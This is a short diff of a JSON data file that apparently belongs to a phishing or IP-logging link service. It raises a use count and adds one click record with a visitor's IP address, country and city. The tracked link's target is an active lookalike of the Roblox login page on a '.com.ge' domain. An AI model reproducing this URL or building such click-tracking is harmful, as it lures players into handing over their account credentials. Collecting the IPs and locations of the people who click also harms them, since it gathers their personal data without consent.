@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 893,
+    "useCount": 894,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7264,6 +7264,14 @@
         "city": "Sapporo",
         "flag": "🇯🇵",
         "countryCode": "JP"
+      },
+      {
+        "timestamp": 1777194426496,
+        "ip": "46.39.20.213",
+        "country": "Russia",
+        "city": "Langepas",
+        "flag": "🇷🇺",
+        "countryCode": "RU"
       }
     ]
   },
